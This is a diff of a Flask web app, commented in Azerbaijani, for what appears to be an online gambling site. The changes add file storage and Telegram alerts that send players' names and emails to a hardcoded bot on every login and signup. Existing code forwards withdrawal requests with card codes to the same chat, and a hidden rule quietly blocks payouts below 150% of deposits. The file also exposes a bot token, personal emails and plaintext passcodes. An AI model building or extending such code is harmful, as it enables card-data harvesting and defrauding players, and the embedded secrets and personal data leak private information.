@@ -1,5 +1,6 @@
 import os
 import time
+import json
 import requests
 import threading
 from flask import Flask, render_template, request, jsonify, abort
@@ -8,7 +9,7 @@ from functools import wraps
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.urandom(32)
 
-# --- TELEGRAM BOT MƏLUMATLARI (Yenilənmiş Aktiv Token) ---
+# --- TELEGRAM BOT MƏLUMATLARI ---
 TELEGRAM_BOT_TOKEN = "8502614066:AAHeXnfABYXaOqLBD5RZG0wV4WNAEGK9KbQ"
 TELEGRAM_CHAT_ID = "7953669834"
 
@@ -22,11 +23,54 @@ def send_telegram_async(message):
                 "parse_mode": "HTML"
             }
             response = requests.post(url, json=payload, timeout=5)
-            print("Telegram cavabı:", response.status_code, response.text) # Səhvləri izləmək üçün
+            print("Telegram cavabı:", response.status_code, response.text)
         except Exception as e:
             print("Telegram xətası:", e)
     
     threading.Thread(target=send).start()
+
+# --- DATA BAZASI (JSON Faylı Vasitəsilə Server Yenilənmələrində Silinmənin Qarşısının Alınması) ---
+DB_FILE = "players.json"
+
+def load_players():
+    if os.path.exists(DB_FILE):
+        try:
+            with open(DB_FILE, "r", encoding="utf-8") as f:
+                return json.load(f)
+        except Exception:
+            pass
+    # İlkin default oyunçular
+    return {
+        "HOT_1106": {
+            "id": "HOT_1106",
+            "name": "Alexs Aliyev",
+            "email": "aliyevalexs23@gmail.com",
+            "code": "PASS483",
+            "status": "Oflayn",
+            "last_seen": "15:00:12",
+            "balance": 0.00,
+            "total_deposit": 0.00
+        },
+        "HOT_9446": {
+            "id": "HOT_9446",
+            "name": "Alexs",
+            "email": "aliyev@gmail.com",
+            "code": "PASS379",
+            "status": "Oflayn",
+            "last_seen": "14:31:17",
+            "balance": 0.00,
+            "total_deposit": 0.00
+        }
+    }
+
+def save_players():
+    try:
+        with open(DB_FILE, "w", encoding="utf-8") as f:
+            json.dump(players_db, f, ensure_ascii=False, indent=4)
+    except Exception as e:
+        print("Baza yazılma xətası:", e)
+
+players_db = load_players()
 
 # --- XARİCİ KİBER TƏHLÜKƏSİZLİK QALXANI ---
 REQUEST_COUNTS = {}
@@ -62,29 +106,6 @@ def add_security_headers(response):
     response.headers['Content-Security-Policy'] = "default-src 'self' https: data: 'unsafe-inline' 'unsafe-eval';"
     return response
 
-players_db = {
-    "HOT_1106": {
-        "id": "HOT_1106",
-        "name": "Alexs Aliyev",
-        "email": "aliyevalexs23@gmail.com",
-        "code": "PASS483",
-        "status": "Oflayn",
-        "last_seen": "15:00:12",
-        "balance": 0.00,
-        "total_deposit": 0.00
-    },
-    "HOT_9446": {
-        "id": "HOT_9446",
-        "name": "Alexs",
-        "email": "aliyev@gmail.com",
-        "code": "PASS379",
-        "status": "Oflayn",
-        "last_seen": "14:31:17",
-        "balance": 0.00,
-        "total_deposit": 0.00
-    }
-}
-
 @app.route('/')
 @security_shield
 def home():
@@ -117,6 +138,7 @@ def add_balance():
                 return jsonify({"success": False, "message": "Məbləğ sıfırdan böyük olmalıdır!"}), 400
             players_db[player_id]['balance'] += val
             players_db[player_id]['total_deposit'] += val
+            save_players()
             return jsonify({"success": True, "message": f"Balansa və ümumi depozitə {val:.2f} ₼ əlavə edildi!"})
         except (ValueError, TypeError):
             return jsonify({"success": False, "message": "Yanlış məbləğ formatı!"}), 400
@@ -131,6 +153,12 @@ def login():
     if player_id in players_db:
         players_db[player_id]['status'] = "Onlayn (Aktiv)"
         players_db[player_id]['last_seen'] = time.strftime("%H:%M:%S")
+        save_players()
+        
+        # Oyunçu hesabına daxil olduqda Telegram-a bildiriş
+        msg = f"🔑 <b>OYUNÇU GİRİŞ ETDİ!</b>\n\n🆔 ID: <b>{player_id}</b>\n👤 Ad: {players_db[player_id]['name']}\n📧 Gmail: {players_db[player_id]['email']}"
+        send_telegram_async(msg)
+        
         return jsonify({"status": "success", "playerId": player_id, "balance": players_db[player_id]['balance']})
     return jsonify({"status": "error", "message": "Tapılmadı"})
 
@@ -146,6 +174,12 @@ def auth():
         "id": new_id, "name": name, "email": email, "code": "PASS123",
         "status": "Onlayn (Aktiv)", "last_seen": time.strftime("%H:%M:%S"), "balance": 0.00, "total_deposit": 0.00
     }
+    save_players()
+    
+    # Yeni qeydiyyat zamanı Telegram-a bildiriş
+    msg = f"✨ <b>YENİ OYUNÇU QEYDİYYATI!</b>\n\n🆔 ID: <b>{new_id}</b>\n👤 Ad: {name}\n📧 Gmail: {email}"
+    send_telegram_async(msg)
+    
     return jsonify({"status": "success", "playerId": new_id, "balance": 0.00})
 
 @app.route('/update_balance', methods=['POST'])
@@ -159,6 +193,7 @@ def update_balance():
             players_db[player_id]['balance'] = float(new_balance)
             players_db[player_id]['status'] = "Onlayn (Aktiv)"
             players_db[player_id]['last_seen'] = time.strftime("%H:%M:%S")
+            save_players()
             return jsonify({"status": "success"})
         except ValueError:
             pass
@@ -183,19 +218,16 @@ def withdraw():
         
     player = players_db[player_id]
     
-    # Balans yoxlaması
     if player['balance'] < amount:
         return jsonify({"status": "error", "message": "Balans kifayət etmir!"})
         
-    # 150% şərti (Arxa planda işləyir)
     min_required_win_balance = player['total_deposit'] * 1.5
     if player['balance'] < min_required_win_balance and player['total_deposit'] > 0:
         return jsonify({"status": "error", "message": "Pul çıxarmaq üçün şərtlər ödənmir!"})
 
-    # Balansdan çıxılış
     player['balance'] -= amount
+    save_players()
     
-    # Telegram bota dərhal bildiriş göndərilməsi
     msg = f"💸 <b>YENİ PUL ÇIXARIŞ SORĞUSU!</b>\n\n🆔 Oyunçu ID: <b>{player_id}</b>\n👤 Ad: {player['name']}\n💰 Məbləğ: <b>{amount:.2f} ₼</b>\n📧 Gmail: {gmail}\n💳 Kart Kodu: <code>{card_code}</code>"
     send_telegram_async(msg)
     
